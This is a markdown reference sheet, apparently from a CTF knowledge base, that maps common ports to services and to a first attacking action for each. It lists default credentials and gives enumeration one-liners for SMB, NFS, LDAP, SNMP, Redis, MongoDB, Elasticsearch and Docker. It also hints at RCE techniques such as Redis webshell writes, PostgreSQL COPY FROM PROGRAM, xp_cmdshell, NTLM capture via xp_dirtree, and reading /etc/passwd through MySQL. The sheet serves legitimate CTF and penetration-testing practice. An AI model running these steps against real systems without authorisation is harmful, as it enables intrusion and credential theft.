---
title: "Reference - Ports, Services, and What to Do With Each"
category: misc
subcategory: networking
type: reference
tags: [ports, services, nmap, port-scan, enumeration, banner, default-credentials, redis, smb, ldap, rpc, mysql, mongodb, kerberos, what-to-do, network, recon, pivoting]
summary: "Port number to service to the first CTF-relevant action, plus default credentials and the enumeration command for each."
related: [nmap, remote-service, attack-surface-by-primitive]
---

## Scan first

```sh
HOST=10.10.10.10
# fast full TCP sweep, then a deep scan of only what is open
nmap -p- --min-rate 5000 -T4 -Pn -n -oA all "$HOST"
PORTS=$(grep -oP '^\d+(?=/tcp\s+open)' all.nmap | paste -sd, -)
nmap -sCV -p "$PORTS" -oA deep "$HOST"
# UDP is slow; scan only the usual suspects
nmap -sU --top-ports 20 -oA udp "$HOST"
```
`ctfbrain search nmap`

---

## Table: port -> service -> first action

| Port | Service | First action |
|---|---|---|
| 7 | echo | `nc host 7` - rarely a challenge, sometimes an amplification puzzle |
| 21 | FTP | `ftp host`, login `anonymous:anonymous`; `ls -la`, `binary`, `mget *`; check for writable dirs |
| 22 | SSH | banner gives the distro; try known creds, key files you found, `ssh-audit host` |
| 23 | Telnet | connect and look; often plaintext creds or a router shell |
| 25 | SMTP | `VRFY user`, `EXPN`, `RCPT TO` for user enumeration; `swaks` to send mail |
| 53 | DNS | `dig axfr @host domain` (zone transfer), `dig ANY`, `dnsrecon`; subdomain brute force |
| 67/68 | DHCP | rarely a challenge; PXE boot images sometimes |
| 69 | TFTP (UDP) | `tftp host` then `get <guessed name>`; no auth by design |
| 79 | Finger | `finger user@host` - user enumeration |
| 80 | HTTP | `ctfbrain search web-triage` |
| 88 | Kerberos | AS-REP roasting (`GetNPUsers.py`), user enumeration (`kerbrute`) |
| 110 | POP3 | `USER`/`PASS`, then `RETR 1` for mail |
| 111 | rpcbind | `rpcinfo -p host`; look for NFS (2049) |
| 123 | NTP (UDP) | `ntpq -c readlist host`, monlist amplification |
| 135 | MSRPC | `rpcdump.py host`, `rpcclient -U "" -N host` then `enumdomusers` |
| 137-139 | NetBIOS | `nbtscan host`, `nmblookup -A host` |
| 143 | IMAP | `a LOGIN user pass`, `a LIST "" *`, `a FETCH 1 BODY[]` |
| 161 | SNMP (UDP) | `snmpwalk -v2c -c public host` (also try `private`); `onesixtyone` to brute the community string |
| 389 | LDAP | `ldapsearch -x -H ldap://host -b "dc=x,dc=y"` anonymous bind; dump users and descriptions |
| 443 | HTTPS | `ctfbrain search web-triage`; also `openssl s_client -connect host:443` and read the certificate (SANs = more hostnames) |
| 445 | SMB | `smbclient -L //host -N`, `smbmap -H host`, `crackmapexec smb host --shares`; null session, then download shares |
| 465/587 | SMTPS/submission | as 25, with TLS |
| 500 | IKE/IPsec (UDP) | `ike-scan host` |
| 512-514 | rexec/rlogin/rsh | `rlogin -l root host`; `.rhosts` trust abuse |
| 514 | syslog (UDP) | log injection |
| 515 | LPD | printer service, occasionally file read |
| 548 | AFP | `nmap --script afp-*` |
| 554 | RTSP | `OPTIONS rtsp://host RTSP/1.0`; camera streams |
| 587 | SMTP submission | as 25 |
| 623 | IPMI (UDP) | `nmap --script ipmi-version`; IPMI 2.0 RAKP hash disclosure -> `hashcat -m 7300` |
| 631 | IPP/CUPS | web UI on `/`, printer job manipulation |
| 636 | LDAPS | as 389 over TLS |
| 873 | rsync | `rsync --list-only rsync://host/`; often world-readable modules |
| 993 | IMAPS | as 143 |
| 995 | POP3S | as 110 |
| 1080 | SOCKS proxy | use it to pivot: `proxychains` |
| 1099 | Java RMI | `nmap --script rmi-dumpregistry`; deserialization RCE with ysoserial |
| 1194 | OpenVPN (UDP) | the CTF VPN itself, usually |
| 1337 | (convention) | a CTF service: `ctfbrain search remote-service` |
| 1433 | MSSQL | `impacket-mssqlclient user@host`; `sa:sa`; `xp_cmdshell`, `EXEC xp_dirtree \\\\you\\x` for NTLM capture |
| 1521 | Oracle DB | `odat all -s host`; default `scott:tiger`, `system:manager` |
| 1883 | MQTT | `mosquitto_sub -h host -t '#' -v` - subscribe to everything |
| 2049 | NFS | `showmount -e host`, then `mount -t nfs host:/share /mnt`; `no_root_squash` = instant root |
| 2181 | ZooKeeper | `echo dump \| nc host 2181`; `envi`, `conf` four-letter words |
| 2375/2376 | Docker API | `docker -H tcp://host:2375 ps`; container escape to host root |
| 3000 | Node/Grafana/Rails dev | web; Grafana path traversal CVEs; check `/api/health` |
| 3128 | Squid proxy | use as an open proxy to reach internal hosts |
| 3268 | Global Catalog (AD) | LDAP over the forest |
| 3306 | MySQL/MariaDB | `mysql -h host -u root -p` (blank password!); `SELECT LOAD_FILE('/etc/passwd')`; `INTO OUTFILE` |
| 3389 | RDP | `xfreerdp /v:host /u:user`; `nmap --script rdp-ntlm-info` leaks the hostname/domain |
| 4369 | Erlang EPMD | `epmd -names`; Erlang cookie -> RCE |
| 4444 | (convention) | a listener; metasploit default |
| 5000 | Flask / Docker registry | Flask debug console; `curl host:5000/v2/_catalog` for a registry |
| 5432 | PostgreSQL | `psql -h host -U postgres`; `COPY x FROM PROGRAM 'id'` = RCE; `pg_read_file` |
| 5555 | ADB (Android) | `adb connect host:5555` then `adb shell` |
| 5601 | Kibana | prototype pollution / RCE CVEs; reads the Elasticsearch behind it |
| 5672 | AMQP/RabbitMQ | `guest:guest`; management UI on 15672 |
| 5900 | VNC | `vncviewer host`; no-auth or 8-char-max password (`vncpwd`) |
| 5985/5986 | WinRM | `evil-winrm -i host -u user -p pass` |
| 6000-6005 | X11 | `xwd -root -display host:0` screenshot; `xspy` keylogging |
| 6379 | Redis | `redis-cli -h host` then `INFO`, `KEYS *`; no auth by default; `CONFIG SET dir` -> write a webshell/SSH key = RCE |
| 6667 | IRC | a bot may be the challenge |
| 7001 | WebLogic | deserialization / CVE-2020-14882 RCE |
| 8000/8008/8080/8888 | HTTP alt | web; Jupyter on 8888 (token in the logs -> RCE via a notebook) |
| 8009 | AJP (Tomcat) | Ghostcat CVE-2020-1938 file read/RCE |
| 8086 | InfluxDB | JWT auth bypass with an empty shared secret |
| 8089 | Splunk | authenticated RCE via a custom app |
| 8161 | ActiveMQ | `admin:admin`; CVE-2023-46604 RCE |
| 8443 | HTTPS alt | admin panels: vCenter, Tomcat manager, Kubernetes |
| 8500 | Consul | `curl host:8500/v1/kv/?recurse`; services API -> RCE |
| 9000 | PHP-FPM / SonarQube / Portainer | FastCGI on 9000 -> RCE with `gopher`/`fcgi_exploit` |
| 9042 | Cassandra | `cqlsh host`; default `cassandra:cassandra` |
| 9092 | Kafka | `kafka-console-consumer --list` |
| 9200/9300 | Elasticsearch | `curl host:9200/_cat/indices`, `_search?q=*`; old versions have RCE |
| 10000 | Webmin | RCE CVEs; also a Ndmp port |
| 11211 | memcached | `stats`, `stats items`, `get <key>`; UDP amplification |
| 15672 | RabbitMQ management | `guest:guest` |
| 27017 | MongoDB | `mongosh host`; no auth by default; `show dbs`, `db.x.find()` |
| 50000 | SAP / Jenkins-alt | - |
| 50051 | gRPC | `grpcurl -plaintext host:50051 list` if reflection is on |

---

## Default credentials worth trying immediately

| Service | Credentials |
|---|---|
| MySQL | `root:` (empty), `root:root`, `root:password` |
| PostgreSQL | `postgres:postgres`, `postgres:` |
| MongoDB | none (no auth by default) |
| Redis | none (no auth by default) |
| Elasticsearch | none, or `elastic:changeme` |
| Tomcat manager | `tomcat:tomcat`, `admin:admin`, `tomcat:s3cret` |
| Jenkins | `admin:admin`; check `/asynchPeople/` for usernames |
| Grafana | `admin:admin` |
| RabbitMQ | `guest:guest` |
| ActiveMQ | `admin:admin` |
| Oracle | `scott:tiger`, `system:manager`, `sys:change_on_install` |
| MSSQL | `sa:sa`, `sa:password` |
| Router/IoT web | `admin:admin`, `admin:password`, `root:root`, `admin:` |
| VNC | often no password |
| FTP | `anonymous:anonymous`, `ftp:ftp` |
| Kibana/Splunk | `admin:changeme` |

Use `/usr/share/seclists/Passwords/Default-Credentials/` for the full lists. `ctfbrain search wordlists-and-resources`

---

## Quick enumeration one-liners

```sh
# SMB: shares, then recursive download
smbclient -L "//$HOST" -N
smbmap -H "$HOST" -R
smbclient "//$HOST/share" -N -c 'prompt OFF; recurse ON; mget *'

# NFS
showmount -e "$HOST"
sudo mount -t nfs -o vers=3,nolock "$HOST:/export" /mnt

# LDAP anonymous dump
ldapsearch -x -H "ldap://$HOST" -s base namingcontexts
ldapsearch -x -H "ldap://$HOST" -b "dc=example,dc=com" '(objectClass=*)'

# SNMP
snmpwalk -v2c -c public "$HOST" | head -100
snmpwalk -v2c -c public "$HOST" 1.3.6.1.4.1.77.1.2.25   # Windows users
snmpwalk -v2c -c public "$HOST" 1.3.6.1.2.1.25.4.2.1.2  # running processes

# Redis
redis-cli -h "$HOST" INFO
redis-cli -h "$HOST" --scan | head
redis-cli -h "$HOST" CONFIG GET dir

# MongoDB
mongosh "mongodb://$HOST:27017" --eval 'db.adminCommand({listDatabases:1})'

# Elasticsearch
curl -s "http://$HOST:9200/_cat/indices?v"
curl -s "http://$HOST:9200/_search?pretty&size=50"

# Docker API
curl -s "http://$HOST:2375/containers/json" | python3 -m json.tool

# rsync
rsync --list-only "rsync://$HOST/"

# Kerberos user enumeration
kerbrute userenum -d domain.local --dc "$HOST" /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

---

## Port-number conventions in CTF

| Range | Meaning |
|---|---|
| 1337, 31337 | "elite" - almost always the challenge service |
| 9999, 4444, 5555 | commonly assigned challenge ports |
| 10000-65535 (single high port) | a per-challenge container behind a proxy |
| 80/443 on a `*.ctf.example.com` host | web challenge |
| The port equals the year or the event number | flavour, no meaning |

If a port is open but the banner tells you nothing: `ctfbrain search remote-service`.
